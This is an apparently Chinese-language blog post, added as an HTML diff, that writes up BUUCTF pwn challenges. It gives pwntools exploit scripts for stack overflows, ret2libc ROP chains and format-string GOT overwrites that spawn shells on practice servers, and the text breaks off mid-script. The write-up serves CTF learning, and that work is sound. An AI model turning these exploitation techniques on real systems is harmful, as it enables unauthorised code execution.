@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>BUU-PWN</title>
+
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/post.css">
+    
+        <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/normal.css">
+    
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/jquery-3.4.1.min.js"></script>
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+<body>
+    <a id="cover"></a>
+    <div id="header">
+    <div class="header">
+        <div class="vertical">
+            <div class="inner">
+                <h1 class="header-subtitle">BUU-PWN</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2021-11-24
+                        </span>
+                        
+                            <span id="/2021/11/24/BUU-PWN/" class="leancloud_visitors" data-flag-title="BUU-PWN">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2021/11/24/BUU-PWN/"></span>
+                        </span>  
+                    </p>                 
+                </div>
+            </div>
+        </div>
+        <canvas id="articleHeaderCanvas"></canvas>
+    </div>
+</div>
+    <div id="container">
+    <div id="content">
+        <div id="article">
+    <div class="toc"></div>
+    <div class="article-body">
+        <h1 id="BUU-PWN"><a href="#BUU-PWN" class="headerlink" title="BUU-PWN"></a>BUU-PWN</h1><p>所有题目均来自<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>通过名字一眼看出要用到nc，所以命令行运行nc</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNNaz4.png" alt="oNNaz4.png"></p>
+<p>开启靶机获取靶机地址，将地址中的冒号改为空格</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNNNJU.png" alt="oNNNJU.png"></p>
+<p>输入ls查询目录，发现有flag文件，所以输入命令cat flag获得flag</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNNUWF.png" alt="oNNUWF.png"></p>
+<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>IDA打开文件，发现后门函数fun，记录后门函数地址</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNNtiT.png" alt="oNNtiT.png"></p>
+<p>然后查看main函数的伪代码，双击s得到s在栈中的位置为F，即为15</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNNwQJ.png" alt="oNNwQJ.png"></p>
+<p>遂编写exp</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNN0y9.png" alt="oNN0y9.png"></p>
+<p>获得shell，ls查看列表，cat flag得到flag</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNNBLR.png" alt="oNNBLR.png"></p>
+<h2 id="warmup-csaw-2016（sprintf栈溢出漏洞）"><a href="#warmup-csaw-2016（sprintf栈溢出漏洞）" class="headerlink" title="warmup_csaw_2016（sprintf栈溢出漏洞）"></a>warmup_csaw_2016（sprintf栈溢出漏洞）</h2><p>先checksec文件，发现未开启任何保护</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNU1pD.png" alt="oNU1pD.png"></p>
+<p>IDA打开文件，查看main函数，双击sprintf后面的函数，发现返回值是一个system函数可以cat flag，所以我们就需要控制gets溢出后能获得这个flag，顺手记录该函数地址</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNUQfO.png" alt="oNUQfO.png"></p>
+<p>首先先cyclic 200创建一个200个字符的字符串</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNU31e.png" alt="oNU31e.png"></p>
+<p>然后进入pwndbg调试，发现RSP是从saaa开始的</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNU86H.png" alt="oNU86H.png"></p>
+<p>所以根据小端序，即可得出saaa前面有72个字符，即偏移量为72</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNUMtK.png" alt="oNUMtK.png"></p>
+<p>编写exp</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNUGXd.png" alt="oNUGXd.png"></p>
+<p>得到flag</p>
+<p><img src="https://z3.ax1x.com/2021/12/02/oNUYnA.png" alt="oNUYnA.png"></p>
+<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>IDA打开文件，查看main函数，然后查看func函数，得知当v2&#x3D;&#x3D;11.28125时获得flag，checksec文件发现并未开启CANARY，即可以进行栈溢出攻击</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210719214451411.png" alt="image-20210719214451411"></p>
+<p>查看v1，v2所在地址，得出v2到v1之间的距离为0x30-0x4，即为44，再将11.28125转换为16进制机器存储（搜索浮点数的储存）</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210719214855040.png" alt="image-20210719214855040"></p>
+<p>编写exp</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210719214940612.png" alt="image-20210719214940612"></p>
+<p>获得flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210719215018603.png" alt="image-20210719215018603"></p>
+<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>先checksec文件，发现只开启了NX保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720190612138.png" alt="image-20210720190612138"></p>
+<p>打开文件随便输入了一些字符，没发现有什么特别的反应</p>
+<p>打开IDA，查看main函数，发现vuln函数，双击点进去经过审计可以得知，通过fgets函数限制输入，最多不能输入超过32B的字符；还存在一个replace函数，可将输入的i替换成you；同时s的大小为0x3c</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720191258028.png" alt="image-20210720191258028"></p>
+<p>还发现一个函数名为get_flag，查看得知起始地址为0x8048F0D</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720191532277.png" alt="image-20210720191532277"></p>
+<p>故构建payload，编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28519</span>)</span><br><span class="line">payload=<span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;aaaa&#x27;</span>+p32(<span class="number">0x8048F0D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720191636825.png" alt="image-20210720191636825"></p>
+<h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>这题有点白给</p>
+<p>先checksec文件，发现只开启了NX保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720200916203.png" alt="image-20210720200916203"></p>
+<p>IDA查看文件，发现有后门函数callsystem，地址为0x400596</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720201233844.png" alt="image-20210720201233844"></p>
+<p>双击点开buf，得知地址从0x80开始到0x08返回，read函数又可以实现栈溢出，所以编写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27801</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>)+p64(<span class="number">0x400596</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720201616882.png" alt="image-20210720201616882"></p>
+<h2 id="ciscn-2019-c-1（ret2libc）"><a href="#ciscn-2019-c-1（ret2libc）" class="headerlink" title="ciscn_2019_c_1（ret2libc）"></a>ciscn_2019_c_1（ret2libc）</h2><p>先checksec文件，发现只开启了NX保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720155452032.png" alt="image-20210720155452032"></p>
+<p>IDA打开文件，发现没有后门函数和system函数，只好查看main函数和encrypt函数，发现是一个解密加密的程序，会对我们的payload异或进而破坏payload</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720155826695.png" alt="image-20210720155826695"></p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720155932104.png" alt="image-20210720155932104"></p>
+<p>因为encrypt函数中使用的是gets，所以存在栈溢出，所以我们先对s进行异或操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">string</span>):</span><br><span class="line">    newstr = <span class="built_in">list</span>(string)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(newstr)):</span><br><span class="line">        c = <span class="built_in">ord</span>(string[i])</span><br><span class="line">        <span class="keyword">if</span> c &lt;= <span class="number">96</span> <span class="keyword">or</span> c &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> c &lt;= <span class="number">64</span> <span class="keyword">or</span> c &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> c &gt; <span class="number">47</span> <span class="keyword">and</span> c &lt;= <span class="number">57</span>:</span><br><span class="line">                    c ^= <span class="number">0xF</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">               c ^= <span class="number">0xE</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c ^= <span class="number">0xD</span></span><br><span class="line">        newstr[i] = <span class="built_in">chr</span>(c)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(newstr)</span><br></pre></td></tr></table></figure>
+
+<p>因为没有后门函数，所以想说puts函数打印出put_got，然后用libcsearcher获取libcbase、system、binsh，但是实在不太会用libcsearcher，就用<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search</a>替代了</p>
+<p>构造payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400C83</span> </span><br><span class="line"><span class="comment">#start_addr = 0x0000000000400790</span></span><br><span class="line">main_addr = <span class="number">0x000000000400B28</span> </span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<p>得到libc</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720161734172.png" alt="image-20210720161734172"></p>
+<p>在网站上搜索，找到libcbase、system、binsh的偏移量</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720161847852.png" alt="image-20210720161847852"></p>
+<p>所以得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libcbase = addr - <span class="number">0x0809c0</span></span><br><span class="line">sys_addr = libcbase + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x1b3e9a</span></span><br></pre></td></tr></table></figure>
+
+<p>完善exp，即获得flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720162557774.png" alt="image-20210720162557774"></p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720162328339.png" alt="image-20210720162328339"></p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">string</span>):</span><br><span class="line">    newstr = <span class="built_in">list</span>(string)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(newstr)):</span><br><span class="line">        c = <span class="built_in">ord</span>(string[i])</span><br><span class="line">        <span class="keyword">if</span> c &lt;= <span class="number">96</span> <span class="keyword">or</span> c &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> c &lt;= <span class="number">64</span> <span class="keyword">or</span> c &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> c &gt; <span class="number">47</span> <span class="keyword">and</span> c &lt;= <span class="number">57</span>:</span><br><span class="line">                    c ^= <span class="number">0xF</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">               c ^= <span class="number">0xE</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c ^= <span class="number">0xD</span></span><br><span class="line">        newstr[i] = <span class="built_in">chr</span>(c)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(newstr)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26143</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400C83</span> </span><br><span class="line"><span class="comment">#start_addr = 0x0000000000400790</span></span><br><span class="line">main_addr = <span class="number">0x000000000400B28</span> </span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendline(encrypt(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment">#print encrypt(payload)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libcbase = addr - <span class="number">0x0809c0</span></span><br><span class="line">sys_addr = libcbase + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x1b3e9a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print &#x27;str_bin_sh=&#x27;,hex(libc.dump(&#x27;str_bin_sh&#x27;))</span></span><br><span class="line"><span class="comment">#print libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload_Ubuntu18 = <span class="string">&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload_Ubuntu18)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="第五空间2019-决赛-PWN5（格式化字符串）"><a href="#第五空间2019-决赛-PWN5（格式化字符串）" class="headerlink" title="[第五空间2019 决赛]PWN5（格式化字符串）"></a>[第五空间2019 决赛]PWN5（格式化字符串）</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>先checksec文件，发现开启了NX保护和CANARY保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720212905019.png" alt="image-20210720212905019"></p>
+<p>用IDA打开文件，发现printf(&amp;buf)，可以判断为格式化字符串漏洞</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720213418239.png" alt="image-20210720213418239"></p>
+<p>审计代码尝试<strong>利用格式化字符串改写unk_804C044之中的数据，然后输入数据对比得到shell</strong>，所以首先查找偏移量，输入AAAA %08x %08x %8x %08x %08x %08x %08x %08x %08x %8x %08x %08x %08x %08x……，找到首地址的偏移（找到41414141就是AAAA）</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720213713673.png" alt="image-20210720213713673"></p>
+<p>我们先来看一下几个经常用来测试格式化字符串的格式控制符<br><strong>%d 用于读取10进制数值</strong><br><strong>%x 用于读取16进制数值</strong> 　　<br><strong>%s 用于读取字符串值</strong>　<br><strong>%n 用于讲当前字符串的长度打印到var中，默认写入4字节，也可以用h来占位</strong></p>
+<p><img src="https://images1.tqwba.com/20200831/s5zvmkptwhi.png" alt="[BUUCTF]PWN10——[第五空间2019 决赛]PWN5"></p>
+<p><strong>%$定位参数符</strong></p>
+<p><img src="https://images1.tqwba.com/20200831/hbhxrk0ovr5.png" alt="[BUUCTF]PWN10——[第五空间2019 决赛]PWN5"></p>
+<p>AAAA对应的十六进制是41414141，可以看到我们输入的参数是在栈上的第10个位置（从AAAA开始往后数），就是说我们之后在利用的时候可以直接利用 <strong>%10$</strong> 定位到这个位置</p>
+<p>构造exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp1</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26349</span>)</span><br><span class="line">target_addr=<span class="number">0x804C044</span></span><br><span class="line">payload=p32(<span class="number">0x804C044</span>)+p32(<span class="number">0x804C045</span>)+p32(<span class="number">0x804C046</span>)+p32(<span class="number">0x804C047</span>)</span><br><span class="line">payload+=<span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"><span class="comment">#q.recvuntil(&quot;your name:&quot;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#q.recvuntil(&quot;Hello,&quot;)</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210720214458347.png" alt="image-20210720214458347"></p>
+<h3 id="Method2"><a href="#Method2" class="headerlink" title="Method2"></a>Method2</h3><p><strong>利用格式化字符串改写atoi的got地址，将其改为system的地址，配合之后的输入，得到shell</strong></p>
+<p>利用函数fmtstr_payload构造payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26441</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn5&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>先checksec文件，发现开启了RELRO和NX保护，同时还是个32位的程序</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210721164318437.png" alt="image-20210721164318437"></p>
+<p>用IDA打开文件，没有发现system函数和&#x2F;bin&#x2F;sh字符，所以想说是不是libc泄漏</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210721164629366.png" alt="image-20210721164629366"></p>
+<p> sub_804871F函数将上方读取的随机数和用户输入的字符进行长度比较然后返回v5</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210721164808513.png" alt="image-20210721164808513"></p>
+<p>sub_80487D0函数则是去控制读入的buf的长度</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210721164924693.png" alt="image-20210721164924693"></p>
+<p>同时可以通过审计得知，a1就是v5，所以构造payload控制v5，然后利用read函数泄漏地址</p>
+<p>buf的地址为0x2c，v5的地址为0x25，计算得知距离为7</p>
+<p>而’\x00’可以绕过字符串比较函数strncmp</p>
+<p>‘\xff’的值为255可改变v5的值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;aaaaaa&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>经过测试发现可以绕过，所以继续构造rop</p>
+<p>泄露write的真实地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write_addr = u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210721170701524.png" alt="image-20210721170701524"></p>
+<p>然后用题目附带的so文件泄露write、system和&#x2F;bin&#x2F;sh的真实地址，针对泄露攻击，找到flag</p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28761</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./[OGeek2019]babyrop&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./[OGeek2019]babyrop&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># system_libc=libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh_libc=libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="comment"># write_libc=libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;aaaaaa&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span 